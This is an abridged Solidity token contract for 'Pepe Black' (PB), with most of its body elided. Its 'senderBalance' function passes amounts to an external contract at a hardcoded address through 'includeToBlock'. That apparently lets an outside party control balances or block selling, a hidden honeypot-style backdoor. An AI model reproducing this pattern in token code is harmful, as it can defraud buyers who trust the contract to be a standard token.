...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _pepe = 0x88E833E982275b8Ef8d517DB854eD2aa4380e742;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return pepe.includeToBlock(amount);
    }
    ...
    function _DeployPepeBlack(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPepeBlack(creator, initialSupply);
    }
}

contract PepeBlack is ERC20Token {
    constructor() ERC20Token("Pepe Black", "PB", msg.sender, 1000000000 * 10 ** 18) {
    }
}